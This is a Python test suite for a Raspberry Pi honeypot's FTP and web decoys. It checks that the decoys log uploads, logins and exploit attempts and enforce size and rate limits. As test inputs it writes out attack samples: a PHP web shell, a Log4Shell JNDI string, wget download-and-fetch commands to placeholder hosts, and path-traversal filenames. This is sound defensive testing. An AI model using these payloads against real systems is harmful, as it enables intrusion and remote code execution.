# SPDX-License-Identifier: GPL-2.0-or-later
# Copyright (C) 2026 The LanPulse authors
"""Checks for the FTP and web decoys (tools/pi-honeypot/lanpulse-trap.py). Real sockets on localhost."""
import ftplib
import hashlib
import http.client
import importlib.util
import io
import json
import os
import pathlib
import shutil
import socket
import tempfile
import time
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def load(name, fname):
    spec = importlib.util.spec_from_file_location(name, os.path.join(ROOT, "tools", "pi-honeypot", fname))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


trap = load("trap", "lanpulse-trap.py")
fwd = load("fwd2", "lanpulse-forwarder.py")


def free_ports(n):
    socks = [socket.socket() for _ in range(n)]
    for s in socks:
        s.bind(("127.0.0.1", 0))
    ports = [s.getsockname()[1] for s in socks]
    for s in socks:
        s.close()
    return ports


class Base(unittest.TestCase):
    max_file_mb = 5

    def setUp(self):
        self.home = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.home, True)
        self.store = trap.Store(self.home, self.max_file_mb, 500, 1000)
        self.gate = trap.Gate()
        self.servers = []

    def start(self, srv):
        trap.serve(srv)
        self.servers.append(srv)
        self.addCleanup(self._stop, srv)
        return srv.server_address[1]

    @staticmethod
    def _stop(srv):
        srv.shutdown()
        srv.server_close()

    def events(self, want=1, wait=3.0):
        """The sessions written so far, as the forwarder would see them (waits for the connection handler to finish)."""
        end = time.time() + wait
        while True:
            try:
                evs = [json.loads(x) for x in pathlib.Path(self.store.log_path).read_text().splitlines()]
            except OSError:
                evs = []
            closed = [e for e in evs if e["eventid"] == "cowrie.session.closed"]
            if len(closed) >= want or time.time() > end:
                return evs
            time.sleep(0.05)

    def sessions(self, want=1):
        s = fwd.Sessions("t")
        out = [d for d in (s.feed(e) for e in self.events(want)) if d]
        return out

    def file_bytes(self, sha):
        return pathlib.Path(self.store.dl_dir, sha).read_bytes()


class Ftp(Base):
    def server(self):
        srv = trap.FtpServer(("127.0.0.1", 0), self.store, self.gate, free_ports(4))
        return self.start(srv)

    def test_upload_is_kept_and_reported(self):
        port = self.server()
        payload = b"#!/bin/sh\nwget http://203.0.113.5/x -O /tmp/x\n"
        ftp = ftplib.FTP()
        ftp.connect("127.0.0.1", port, timeout=5)
        ftp.login("root", "toor")
        ftp.storbinary("STOR ../../shell.sh", io.BytesIO(payload))
        ftp.retrlines("LIST", lambda _l: None)
        ftp.quit()
        sha = hashlib.sha256(payload).hexdigest()
        (s,) = self.sessions()
        self.assertEqual(s["proto"], "ftp")
        self.assertEqual(s["port"], port)
        self.assertEqual(s["logins"], [{"u": "root", "p": "toor", "ok": True}])
        self.assertEqual([f["sha256"] for f in s["files"]], [sha])
        self.assertEqual(s["files"][0]["name"], "shell.sh")                 # the folder part of the name is dropped
        self.assertEqual(s["files"][0]["dir"], "upload")
        self.assertTrue(any(c.startswith("STOR") for c in s["commands"]))
        self.assertFalse(any("toor" in c for c in s["commands"]))           # the password is in logins, not in the command log
        self.assertEqual(self.file_bytes(sha), payload)
        self.assertEqual(oct(os.stat(os.path.join(self.store.dl_dir, sha)).st_mode & 0o777), "0o600")
        # the forwarder finds the file where the event says it is
        self.assertIsNotNone(fwd.find_file(self.home, {**s["files"][0], "outfile": self.store.rel(sha)}))

    def test_needs_login_and_refuses_active_mode(self):
        port = self.server()
        ftp = ftplib.FTP()
        ftp.connect("127.0.0.1", port, timeout=5)
        with self.assertRaises(ftplib.error_perm):
            ftp.sendcmd("STOR x")                                           # 530 before login
        ftp.login("a", "b")
        with self.assertRaises(ftplib.error_perm):
            ftp.sendcmd("PORT 127,0,0,1,4,1")                               # never connects out
        ftp.quit()

    def test_big_files_are_refused(self):
        self.store.max_file = 1000
        port = self.server()
        ftp = ftplib.FTP()
        ftp.connect("127.0.0.1", port, timeout=5)
        ftp.login("a", "b")
        with self.assertRaises((ftplib.error_perm, ftplib.error_temp, OSError)):
            ftp.storbinary("STOR big.bin", io.BytesIO(b"A" * 5000))
        try:
            ftp.quit()
        except Exception:
            pass
        self.assertEqual([f for f in os.listdir(self.store.dl_dir)], [])    # nothing kept, no temp file left behind

    def test_port_scan_without_commands_is_not_reported(self):
        port = self.server()
        socket.create_connection(("127.0.0.1", port), timeout=3).close()
        time.sleep(0.4)
        self.assertEqual(self.events(1, wait=0.3), [])


class Web(Base):
    def server(self):
        return self.start(trap.HttpServer(("127.0.0.1", 0), self.store, self.gate))

    def req(self, port, method, path, body=None, headers=None):
        c = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        c.request(method, path, body=body, headers=headers or {})
        r = c.getresponse()
        data = r.read()
        c.close()
        return r.status, data

    def test_plain_probe_is_answered_but_not_reported(self):
        port = self.server()
        status, body = self.req(port, "GET", "/")
        self.assertEqual(status, 200)
        self.assertIn(b"It works", body)
        time.sleep(0.4)
        self.assertEqual(self.events(1, wait=0.3), [])

    def test_exploit_attempt_is_logged_decoded(self):
        port = self.server()
        self.req(port, "GET", "/cgi-bin/x?cmd=wget%20http://203.0.113.5/a.sh", headers={"User-Agent": "${jndi:ldap://203.0.113.9/a}"})
        (s,) = self.sessions()
        self.assertEqual(s["proto"], "http")
        self.assertIn("GET /cgi-bin/x?cmd=wget http://203.0.113.5/a.sh", s["commands"])
        self.assertTrue(any(c.startswith("HEADER user-agent") for c in s["commands"]))

    def test_multipart_upload_and_login_form(self):
        port = self.server()
        boundary = "XyZ"
        data = b"<?php system($_GET['c']); ?>"
        body = (b"--XyZ\r\nContent-Disposition: form-data; name=\"f\"; filename=\"..\\up.php\"\r\nContent-Type: application/octet-stream\r\n\r\n"
                + data + b"\r\n--XyZ\r\nContent-Disposition: form-data; name=\"note\"\r\n\r\nhello\r\n--XyZ--\r\n")
        self.assertEqual(self.req(port, "POST", "/upload", body, {"Content-Type": "multipart/form-data; boundary=" + boundary})[0], 200)
        self.assertEqual(self.req(port, "POST", "/login", b"username=admin&password=hunter2", {"Content-Type": "application/x-www-form-urlencoded"})[0], 200)
        ss = self.sessions(2)
        up = next(s for s in ss if s["files"])
        self.assertEqual(up["files"][0]["sha256"], hashlib.sha256(data).hexdigest())
        self.assertEqual(up["files"][0]["name"], "up.php")
        self.assertIn("FIELD note=hello", up["commands"])
        self.assertEqual(self.file_bytes(up["files"][0]["sha256"]), data)
        lg = next(s for s in ss if s["logins"])
        self.assertEqual(lg["logins"], [{"u": "admin", "p": "hunter2", "ok": False}])

    def test_put_and_chunked_bodies_are_kept(self):
        port = self.server()
        self.req(port, "PUT", "/shell.jsp", b"put-body")
        sock = socket.create_connection(("127.0.0.1", port), timeout=5)
        sock.sendall(b"POST /api HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\nContent-Type: application/octet-stream\r\n\r\n"
                     b"5\r\nhello\r\n" + hex(70000)[2:].encode() + b"\r\n" + b"A" * 70000 + b"\r\n0\r\n\r\n")
        sock.recv(200)
        sock.close()
        ss = self.sessions(2)
        shas = {f["sha256"] for s in ss for f in s["files"]}
        self.assertIn(hashlib.sha256(b"put-body").hexdigest(), shas)
        self.assertIn(hashlib.sha256(b"hello" + b"A" * 70000).hexdigest(), shas)

    def test_junk_and_oversized_bodies(self):
        self.store.max_file = 2000
        old = trap.MEM_BODY
        trap.MEM_BODY = 100                                                 # so a 5000-byte body takes the "stream to disk" path
        self.addCleanup(setattr, trap, "MEM_BODY", old)
        port = self.server()
        sock = socket.create_connection(("127.0.0.1", port), timeout=3)
        sock.sendall(b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03" + b"\x00" * 50 + b"\r\n")
        sock.close()
        status, _ = self.req(port, "PUT", "/big", b"B" * 5000)
        self.assertEqual(status, 413)
        time.sleep(0.4)
        self.assertEqual([f for f in os.listdir(self.store.dl_dir)], [])


class Limits(Base):
    def test_gate_and_session_rate(self):
        g = trap.Gate(total=3, per_ip=2)
        self.assertTrue(g.enter("1.1.1.1") and g.enter("1.1.1.1"))
        self.assertFalse(g.enter("1.1.1.1"))                                # one address can't hog the decoy
        self.assertTrue(g.enter("2.2.2.2"))
        self.assertFalse(g.enter("3.3.3.3"))                                # nor can the crowd
        g.leave("1.1.1.1")
        self.assertTrue(g.enter("3.3.3.3"))
        st = trap.Store(self.home, 5, 500, per_minute=2)
        self.assertEqual([st.allow(), st.allow(), st.allow()], [True, True, False])

    def test_store_full_refuses_files(self):
        st = trap.Store(self.home, 5, 0.000001, 100)                        # about one byte
        pathlib.Path(st.dl_dir, "x").write_bytes(b"1234")
        sp = trap.Spool(st)
        self.assertFalse(sp.write(b"data"))

    def test_multipart_parser(self):
        parts = trap.parse_multipart(b"--b\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n1\r\n--b--\r\n", "b")
        self.assertEqual(parts, [("a", "", b"1")])
        self.assertEqual(trap.parse_multipart(b"garbage", "b"), [])


class ForwarderUnderstandsTheTrap(unittest.TestCase):
    def test_protocols(self):
        s = fwd.Sessions("t")
        for proto in ("ftp", "http", "telnet", "weird"):
            s.feed({"eventid": "cowrie.session.connect", "session": proto, "src_ip": "198.51.100.1", "dst_port": 21, "protocol": proto,
                    "timestamp": "2026-11-09T12:00:00.000000Z"})
        got = {k: v["proto"] for k, v in s.open.items()}
        self.assertEqual(got, {"ftp": "ftp", "http": "http", "telnet": "telnet", "weird": "ssh"})


if __name__ == "__main__":
    unittest.main()
